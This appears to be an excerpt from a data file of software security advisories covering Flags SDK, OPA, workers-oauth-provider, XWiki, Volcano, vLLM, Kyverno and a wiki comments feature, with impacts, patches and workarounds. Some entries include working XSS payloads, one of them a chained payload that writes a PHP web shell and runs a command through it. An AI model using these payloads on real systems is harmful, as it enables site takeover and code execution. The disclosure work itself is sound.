        "description": "## Summary\n\nAn information disclosure vulnerability affecting Flags SDK has been addressed. It impacted `flags` \u22643.2.0 and `@vercel/flags` \u22643.1.1 and in certain circumstances, allowed a bad actor with detailed knowledge of the vulnerability to list all flags returned by the flags discovery endpoint (`.well-known/vercel/flags`).\n\n## Impact\n\nThis vulnerability allowed for information disclosure, where a bad actor could gain access to a list of all feature flags exposed through the flags discovery endpoint, including the:\n\n- Flag names\n- Flag descriptions\n- Available options and their labels (e.g. `true`, `false`)\n- Default flag values\n\nNot impacted:\n\n- Flags providers were not accessible\n\nNo write access nor additional customer data was exposed, this is limited to just the values noted above. Vercel has automatically mitigated this incident on behalf of our customers for the default flags discovery endpoint at `.well-known/vercel/flags`. Flags Explorer will be disabled and show a warning notice until upgraded to `flags@4.0.0`.\n\n## Resolution\n\nThe `verifyAccess` function was patched within `flags@4.0.0`. \n\nUsers of `@vercel/flags` should also migrate to `flags@4.0.0`.\n\nFor further guidance on upgrading your version, please see our [upgrade guide](https://github.com/vercel/flags/blob/main/packages/flags/guides/upgrade-to-v4.md).\n\n## Mitigations\n\nVercel implemented a network-level mitigation to prevent the default flags discovery endpoint at `/.well-known/vercel/flags` being reachable, which automatically protects Vercel deployments against exploitation of this issue. Users need to upgrade to `flags@4.0.0` to re-enable the Flags Explorer.\n\nThis automatic mitigation is not effective in two scenarios:\n\n- When using the Flags SDK on Pages Router, as the original non-rewritten route would still be accessible, e.g. `/api/vercel/flags`.\n- When using a custom path for the flags discovery endpoint.\n\nIf you are not protected by the Vercel default mitigation you can temporarily deny access to the other exposed flags discovery endpoints through a custom WAF rule while you upgrade to the latest version.\n\n## References\n\n- https://vercel.com/changelog/information-disclosure-in-flags-sdk-cve-2025-46332\n- https://github.com/vercel/flags/blob/main/packages/flags/guides/upgrade-to-v4.md",

        "summary": "OPA server Data API HTTP path injection of Rego",
        "description": "### Impact\n\nWhen run as a server, OPA exposes an HTTP[ Data API](https://www.openpolicyagent.org/docs/latest/rest-api/#data-api) for reading and writing documents. Requesting a virtual document through the Data API entails policy evaluation, where a Rego query containing a single data document [reference](https://www.openpolicyagent.org/docs/latest/policy-language/#references) is constructed from the requested path. This query is then used for policy evaluation.\n\nA HTTP request path can be crafted in a way that injects Rego code into the constructed query. The evaluation result cannot be made to return any other data than what is generated by the requested path, but this path can be misdirected, and the injected Rego code can be crafted to make the query succeed or fail; opening up for oracle attacks or, given the right circumstances, erroneous policy decision results. Furthermore, the injected code can be crafted to be computationally expensive, resulting in a Denial Of Service (DoS) attack.\n\n**Users are only impacted if all of the following apply:**\n\n* OPA is deployed as a standalone server (rather than being used as a Go library)\n* The OPA server is exposed outside of the local host in an untrusted environment.\n* The configured [authorization policy](https://www.openpolicyagent.org/docs/latest/security/#authentication-and-authorization) does not do exact matching of the `input.path` attribute when deciding if the request should be allowed.\n\n**or, if all of the following apply:**\n\n* OPA is deployed as a standalone server.\n* The service connecting to OPA allows 3rd parties to insert unsanitised text into the path of the HTTP request to OPA\u2019s Data API.\n\n**Note:** With **no** Authorization Policy configured for restricting API access (the default configuration), the RESTful Data API provides access for managing Rego policies; and the RESTful Query API facilitates advanced queries. Full access to these APIs provides both simpler, and broader access than what the security issue describes here can facilitate. As such, OPA servers exposed to a network are **not** considered affected by the attack described here if they are knowingly not restricting access through an Authorization Policy.\n\n### Patches\n\nFixed in OPA v1.4.0.\n\n### Workarounds\n\n#### Don\u2019t publicly expose OPA\u2019s RESTful APIs ####\n\nUnless necessary for production reasons, network access to OPA\u2019s RESTful APIs should be limited to `localhost` and/or trusted networks. \nSince OPA v1.0, unless otherwise configured, the server listener defaults to `localhost`.\n\n#### Enable Authentication to Only Allow Access to Trusted Clients ####\n\nA configured [authentication](https://www.openpolicyagent.org/docs/latest/security/#authentication-and-authorization) scheme is a requirement when OPA is exposed in an untrusted environment. While requiring authentication alone doesn\u2019t mitigate this attack, it effectively reduces the scope from untrusted clients to trusted clients.\n\n#### Perform Path Validation Using OPA\u2019s Authorization Policy Functionality ####\n\nOPA can be configured to use an [Authorization Policy](https://www.openpolicyagent.org/docs/latest/security/#authentication-and-authorization) to validate all incoming requests.\nBy authoring the Authorization Policy to only accept paths corresponding to expected Rego package references, this attack can be fully mitigated.\n\nThe HTTP path in a Data API request is of the format `/v1/data/{path:.+}` (`/v0/data/{path:.+}`, for the v0 Data API), where `data/{path:.+}` directly corresponds to a reference to a virtual document, and a prefix of `{path:.+}` corresponds to a Rego `package` declaration. \nE.g. the HTTP path `v1/data/do/re/mi` corresponds to the data reference `data.do.re.mi`, where `do.re` is the package and `mi` is the rule in the following Rego module:\n\n```rego\npackage do.re\n\nmi if {\n\t...\n}\n```\n\nUnless otherwise [configured](https://www.openpolicyagent.org/docs/latest/configuration/#miscellaneous), OPA will use the rule at `data.system.authz.allow` as Authorization Policy. Authorization is enabled by starting OPA with the `--authorization=basic` flag, and the Authorization policy must be made available to the OPA runtime either through a bundle (via the `--bundle` flag or through [discovery](https://www.openpolicyagent.org/docs/latest/management-discovery/)) or as an individual module via the command-line.\n\nA trivial Authorization Policy example:\n\n```rego\npackage system.authz\n\nallowed_paths := [\n\t[\"v1\", \"data\", \"policy1\", \"allow\"],\n\t[\"v1\", \"data\", \"policy2\", \"allow\"],\n\t...\n]\n\nallow if {\n\tinput.path in allowed_paths\n}\n```\n\n**Note:** configuring an Authorization Policy in OPA isn't the only way to protect against malicious request paths. Path validation and sanitisation can also be performed by connecting clients and 3rd party intermediaries, such as API gateways, reverse proxies, etc.",

However, it was found that an attacker could cause the check to be skipped.\n\n### Impact\nUnder certain circumstances (see below), if a victim had previously authorized with a server built on workers-oath-provider, and an attacker could later trick the victim into visiting a malicious web site, then attacker could potentially steal the victim's credentials to the same OAuth server and subsequently impersonate them.\n\nIn order for the attack to be possible, the OAuth server's authorized callback must be designed to auto-approve authorizations that appear to come from an OAuth client that the victim has authorized previously. The authorization flow is not implemented by workers-oauth-provider; it is up to the application built on top to decide whether to implement such automatic re-authorization. However, many applications do implement such logic.\n\n\n### Patches\nFixed in: https://github.com/cloudflare/workers-oauth-provider/pull/26\n\nWe patched up the vulnerabilities in the latest version, v 0.0.5 of the Workers OAuth provider (https://www.npmjs.com/package/@cloudflare/workers-oauth-provider). You'll need to update your MCP servers to use that version to resolve the vulnerability.\n\n\n### Workarounds\nNone\n\n### Note\n\nIt is a basic, well-known requirement that OAuth servers should verify that the redirect URI is among the allowed list for the client, both during the authorization flow and subsequently when exchanging the authorization code for an access token. workers-oauth-provider implemented only the latter check, not the former. Unfortunately, the former is the much more important check.\n\nReaders who are familiar with OAuth may recognize that failing to check redirect URIs against the allowed list is a well-known, basic mistake, covered extensively in the RFC and elsewhere. The author of this library would like everyone to know that he was, in fact, well-aware of this requirement, thought about it a lot while designing the library, and then, somehow, forgot to actually make sure the check was in the code. That is, it's not that he didn't know what he was doing, it's that he knew what he was doing but flubbed it.",

        "description": "# Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-4pc9-x2fx-p7vj. This link is maintained to preserve external references.\n\n# Original Description\nThe OAuth implementation in workers-oauth-provider that is part of  MCP framework https://github.com/cloudflare/workers-mcp , did not correctly validate that redirect_uri was on the allowed list of redirect URIs for the given client registration.\n\nFixed in:\u00a0 https://github.com/cloudflare/workers-oauth-provider/pull/26 https://github.com/cloudflare/workers-oauth-provider/pull/26 \n\nImpact:\n\n \n\nUnder certain circumstances (see below), if a victim had previously authorized with a server built on workers-oath-provider, and an attacker could later trick the victim into visiting a malicious web site, then attacker could potentially steal the victim's credentials to the same OAuth server and subsequently impersonate them.\n\nIn order for the attack to be possible, the OAuth server's authorized callback must be designed to auto-approve authorizations that appear to come from an OAuth client that the victim has authorized previously. The authorization flow is not implemented by workers-oauth-provider; it is up to the application built on top to decide whether to implement such automatic re-authorization. However, many applications do implement such logic.\n\nNote: It is a basic, well-known requirement that OAuth servers should verify that the redirect URI is among the allowed list for the client, both during the authorization flow and subsequently when exchanging the authorization code for an access token. workers-oauth-provider implemented only the latter check, not the former. Unfortunately, the former is the much more important check.\u00a0Readers who are familiar with OAuth may recognize that failing to check redirect URIs against the allowed list is a well-known, basic mistake, covered extensively in the RFC and elsewhere. The author of this library would like everyone to know that he was, in fact, well-aware of this requirement, thought about it a lot while designing the library, and then, somehow, forgot to actually make sure the check was in the code. That is, it's not that he didn't know what he was doing, it's that he knew what he was doing but flubbed it.",

In particular, using Markdown syntax, it's possible for any user to embed Javascript code that will then be executed on the browser of any other user visiting either the document or the comment that contains it. In the instance that this code is executed by a user with admins or programming rights, this issue compromises the confidentiality, integrity and availability of the whole XWiki installation.\n\nTo reproduce, on an instance where the CommonMark Markdown Syntax 1.2 extension is installed, log in as a user without script rights. Edit a document and set its syntax to Markdown. Then , add the content `<script>alert(\"XSS\")</script>` and refresh the page. If an alert appears containing \"XSS\", then the instance is vulnerable.\n\n### Patches\nThis has been patched in version 8.9 of the CommonMark Markdown Syntax 1.2 extension.\n\n### Workarounds\nWe're not aware of any workaround except upgrading.\n\n### References\n* https://jira.xwiki.org/browse/MARKDOWN-80\n* https://github.com/xwiki-contrib/syntax-markdown/commit/d136472d6e8a47981a0ede420a9096f88ffa5035",

So, if no authenticator extension was installed, it's not really possible to do anything for an attacker.\n\nAlso, in most cases, if you have installed and are using an SSO authenticator (like OIDC or LDAP for example), the worst an attacker can do is break authentication by switching back to the standard authenticator (that's because it's impossible to login to a user which does not have a stored password, and that's usually what SSO authenticator produce).\n\n### Patches\n\nThis has been patched in XWiki 15.10.9 and XWiki 16.3.0RC1.\n\n### Workarounds\n\nYou can very easily fix this vulnerability in your instance through right configuration:\n* access the page and children right administration of the page `XWiki.Authentication` (`https://myhost/xwiki/bin/admin/XWiki/Authentication/WebPreferences?editor=spaceadmin&section=PageAndChildrenRights&space=XWiki.Authentication#|t=usersandgroupstable&p=1&l=10&uorg=groups&wiki=local&clsname=XWiki.XWikiGlobalRights`)\n* make sure only admin user have the VIEW right\n\n### References\n\nhttps://jira.xwiki.org/browse/XWIKI-22604\nhttps://github.com/xwiki/xwiki-platform/commit/5efc31cea1501c9a5cb593566fea8b558ff32a2a\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [Jira XWiki.org](https://jira.xwiki.org/)\n* Email us at [Security Mailing List](mailto:security@xwiki.org)",

        "description": "### Impact\nThis issue allows an attacker who has compromised either the Elastic service or the extender plugin to cause denial of service of the scheduler. This is a privilege escalation, because Volcano users may run their Elastic service and extender plugins in separate pods or nodes from the scheduler. In the Kubernetes security model, node isolation is a security boundary, and as such an attacker is able to cross that boundary in Volcano's case if they have compromised either the vulnerable services or the pod/node in which they are deployed.  The scheduler will become unavailable to other users and workloads in the cluster. The scheduler will either crash with an unrecoverable OOM panic or freeze while consuming excessive amounts of memory.\n\n### Workarounds\nNo",

        "description": "### Summary\nA critical performance vulnerability has been identified in the input preprocessing logic of the multimodal tokenizer. The code dynamically replaces placeholder tokens (e.g., <|audio_*|>, <|image_*|>) with repeated tokens based on precomputed lengths. Due to \u200b\u200binefficient list concatenation operations\u200b\u200b, the algorithm exhibits \u200b\u200bquadratic time complexity (O(n\u00b2))\u200b\u200b, allowing malicious actors to trigger resource exhaustion via specially crafted inputs.\n\n### Details\n\u200b\u200bAffected Component\u200b\u200b: input_processor_for_phi4mm function.\nhttps://github.com/vllm-project/vllm/blob/8cac35ba435906fb7eb07e44fe1a8c26e8744f4e/vllm/model_executor/models/phi4mm.py#L1182-L1197\n\nThe code modifies the input_ids list in-place using input_ids = input_ids[:i] + tokens + input_ids[i+1:]. Each concatenation operation copies the entire list, leading to O(n) operations per replacement. For k placeholders expanding to m tokens, total time becomes O(kmn), approximating O(n\u00b2) in worst-case scenarios.\n\n### PoC\nTest data demonstrates exponential time growth:\n```python\ntest_cases = [100, 200, 400, 800, 1600, 3200, 6400]\nrun_times = [0.002, 0.007, 0.028, 0.136, 0.616, 2.707, 11.854]  # seconds\n```\nDoubling input size increases runtime by ~4x (consistent with O(n\u00b2)).\n\n### Impact\n\u200b\u200bDenial-of-Service (DoS):\u200b\u200b An attacker could submit inputs with many placeholders (e.g., 10,000 <|audio_1|> tokens), causing CPU/memory exhaustion.\nExample: 10,000 placeholders \u2192 ~100 million operations.\n\n\n### Remediation Recommendations\u200b\nPrecompute all placeholder positions and expansion lengths upfront.\nReplace dynamic list concatenation with a single preallocated array.\n```python\n# Pseudocode for O(n) solution\nnew_input_ids = []\nfor token in input_ids:\n    if token is placeholder:\n        new_input_ids.extend([token] * precomputed_length)\n    else:\n        new_input_ids.append(token)\n```",

        "summary": "Kyverno vulnerable to bypass of policy rules that use namespace selectors in match statements",
        "description": "### Summary\n\nDue to a missing error propagation in function `GetNamespaceSelectorsFromNamespaceLister` in `pkg/utils/engine/labels.go` it may happen that policy rules using namespace selector(s) in their `match` statements are mistakenly not applied during admission review request processing. As a consequence, security-critical mutations and validations are bypassed, potentially allowing attackers with K8s API access to perform malicious operations.\n\n### Details\n\nAs a policy engine Kyverno is a critical component ensuring the security of Kubernetes clusters by apply security-relevant policy rules in the Kubernetes admission control process.\n\nWe encountered a case where Kyverno did not apply policy rules which should have been applied.  This happened in both the mutation and the validation phase of admission control.  Effectively Kyverno handled the admission review requests as\nif those policy rules did not exist.  Consequently, the Kube API request was accepted without applying security-relevant patches and validations.\n\nAs the root cause we identified a missing error propagation in function `GetNamespaceSelectorsFromNamespaceLister` in `pkg/utils/engine/labels.go` ([src][1]).\n\nAll affected policy rules use a namespace selector in their match resource filters like this:\n\n```yaml\nmatch:\n  all:\n  - resources:\n      namespaceSelector:\n        matchExpressions:\n        - key: label1\n          operator: Exists\n```\n\nSuch specification intents to apply rules only to resource objects which reside in a namespace whose labels match the given label expressions.\n\nWhen Kyverno handles an admission webhook, function `GetNamespaceSelectorsFromNamespaceLister` in package\n`github.com/kyverno/kyverno/pkg/utils/engine` ([src][1]) is called to retrieve the labels of the request object's namespace.  This function gets the namespace object from a `\"k8s.io/client-go/listers/core/v1\".NamespaceLister`.  In case the\nnamespace lister returns an error, `GetNamespaceSelectorsFromNamespaceLister` does NOT propagate this error to its caller, but returns an empty label map, which is equivalent to a namespace without any labels.\n\nThe returned label map is later used to select matching policy rules.  If a rule has a resource filter with namespace selector, it will be mistakenly excluded or included.\n\nThe namespace lister fails to return the namespace object if the underlying `SharedIndexInformer` has not (yet) updated its cache.  Those updates happen based on watch events from the Kube API Server, which does not guarantee any maximum delivery time.  If the Kube API Server handling the watch is under high load or otherwise impaired (e.g. requests to etcd take longer due to pending leader election in HA setup) then informer cache updates can be delayed significantly.  However, we did not find a way to reliably reproduce such condition.\n\nTo bypass Kyverno policies, an attacker may try to exploit the described misbehavior by:\n\n- putting the Kube API Server under load before sending requests that Kyverno policies should be bypassed for.\n\n- sending many request with a high rate to Kube API Server.\n\nWe did not try any of such attack vectors and therefore cannot prove their effectiveness.\n\nIn our scenario the Kyverno policies apply to pods in \"sandbox\" namespaces identified as such by certain labels.  Those single-use namespaces and the pods therein are frequently created (and removed) by other controllers.  Therefore, Kyverno often receives admission webhooks for objects whose namespace has been created shortly before.\n\n#### Correction Proposal\n\nFunction `GetNamespaceSelectorsFromNamespaceLister` in package `github.com/kyverno/kyverno/pkg/utils/engine` ([src][1]) should return an error instead of an empty label map in case it could not get the namespace object from the namespace lister.  This error will then cause admission webhook processing to fail, which lets Kubernetes fail the Kube API request if the policy's failure policy is `Fail` (a must for security-relevant policies).\n\nIn addition, function `GetNamespaceSelectorsFromNamespaceLister` could retry (with deadline) to get the namespace object from the namespace lister in case of a NotFound error.  But as admission webhook processing time should be kept as short as possible, this might not be a good idea.\n\nAnother option would be to perform a GET request for the namespace as a fallback in case the namespace lister returns a NotFound error.\n\n### PoC\n\nWe did not find a way to reliably reproduce such case.\n\n### Impact\n\nAdministrators attempting to enforce cluster security through Kyverno policies, but that allow less privileged users or service accounts to create/update/delete resources.\n\n\n[1]: https://github.com/kyverno/kyverno/blob/a96b1a4794b4d25cb0c6d72c05fc6355e95cf65c/pkg/utils/engine/labels.go#L10",

        "summary": "Data exposure via ZeroMQ on multi-node vLLM deployment",
        "description": "### Impact\nIn a multi-node vLLM deployment, vLLM uses ZeroMQ for some multi-node communication purposes. The primary vLLM host opens an `XPUB` ZeroMQ socket and binds it to ALL interfaces. While the socket is always opened for a multi-node deployment, it is only used when doing tensor parallelism across multiple hosts.\n\nAny client with network access to this host can connect to this `XPUB` socket unless its port is blocked by a firewall. Once connected, these arbitrary clients will receive all of the same data broadcasted to all of the secondary vLLM hosts. This data is internal vLLM state information that is not useful to an attacker.\n\nBy potentially connecting to this socket many times and not reading data published to them, an attacker can also cause a denial of service by slowing down or potentially blocking the publisher.\n\n### Detailed Analysis\n\nThe `XPUB` socket in question is created here:\n\nhttps://github.com/vllm-project/vllm/blob/c21b99b91241409c2fdf9f3f8c542e8748b317be/vllm/distributed/device_communicators/shm_broadcast.py#L236-L237\n\nData is published over this socket via `MessageQueue.enqueue()` which is called by `MessageQueue.broadcast_object()`:\n\nhttps://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/device_communicators/shm_broadcast.py#L452-L453\n\nhttps://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/device_communicators/shm_broadcast.py#L475-L478\n\nThe `MessageQueue.broadcast_object()` method is called by the `GroupCoordinator.broadcast_object()` method in `parallel_state.py`:\n\nhttps://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/parallel_state.py#L364-L366\n\nThe broadcast over ZeroMQ is only done if the `GroupCoordinator` was created with `use_message_queue_broadcaster` set to `True`:\n\nhttps://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/parallel_state.py#L216-L219\n\nThe only case where `GroupCoordinator` is created with `use_message_queue_broadcaster` is the coordinator for the tensor parallelism group:\n\nhttps://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/parallel_state.py#L931-L936\n\nTo determine what data is broadcasted to the tensor parallism group, we must continue tracing. `GroupCoordinator.broadcast_object()` is called by `GroupCoordinator.broadcoast_tensor_dict()`:\n\nhttps://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/parallel_state.py#L489\n\nwhich is called by `broadcast_tensor_dict()` in `communication_op.py`:\n\nhttps://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/communication_op.py#L29-L34\n\nIf we look at `_get_driver_input_and_broadcast()` in the V0 `worker_base.py`, we'll see how this tensor dict is formed:\n\nhttps://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/worker/worker_base.py#L332-L352\n\nbut the data actually sent over ZeroMQ is the `metadata_list` portion that is split from this `tensor_dict`. The tensor parts are sent via `torch.distributed` and only metadata about those tensors is sent via ZeroMQ.\n\nhttps://github.com/vllm-project/vllm/blob/54a66e5fee4a1ea62f1e4c79a078b20668e408c6/vllm/distributed/parallel_state.py#L61-L83\n\n### Patches\n\nNo fix yet.\n\n### Workarounds\n\nPrior to the fix, your options include:\n1. Do not expose the vLLM host to a network where any untrusted connections may reach the host.\n2. Ensure that only the other vLLM hosts are able to connect to the TCP port used for the `XPUB` socket. Note that port used is random.\n\n### References\n\n* Relevant code first introduced in https://github.com/vllm-project/vllm/pull/6183",

        "description": "### Summary\n\nA stored cross-site scripting (XSS) vulnerability was discovered in the application\u2019s comments feature. This issue allows a malicious actor to inject JavaScript payloads that are stored and later executed in the browser of any user viewing the affected comment.\n\nThe XSS occurs because the application fails to properly sanitize or encode user input submitted to the comments. Notably, the application sanitizes or does not allow execution of `<script>` tags, but does not account for payloads obfuscated using JavaScript block comments like `/* JavaScriptPayload */`. \n\n### PoC\nNavigate to a site and page that allows comments and place this in the comments section and submit it: \n\n`/*<script>alert('pizzapower')</script>*/`\n\nUpon submitting to the page, it will run. And then upon every page visit, it will run. \n\n### Impact\n\nAn attacker can run arbitrary JS in the victim's browser (any user that visits the page with the comments). This can be chained to do many malicious actions, such as to achieve RCE when chained with another vulnerability, e.g.: \n\n```\n/*<script>fetch(\"/?api/templates/custom-presets/anhtyjik.php\",{method:\"POST\",headers:{\"Content-Type\":\"application/x-www-form-urlencoded\"},body:\"primary-color=%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E&secondary-color-1=%23d8604c&secondary-color-2=%23d78958&neutral-color=%234e5056&neutral-soft-color=%2357575c&neutral-light-color=%23f2f2f2&main-text-fontsize=17px&main-text-fontfamily=%22Nunito%22%2C+sans-serif&main-title-fontfamily='Nunito'%2C+sans-serif\"});</script>*/\n```\n\nThen you can visit `http://localhost:8085/custom/css-presets/anhtyjik.php?cmd=id` and see the output of the ID command.",
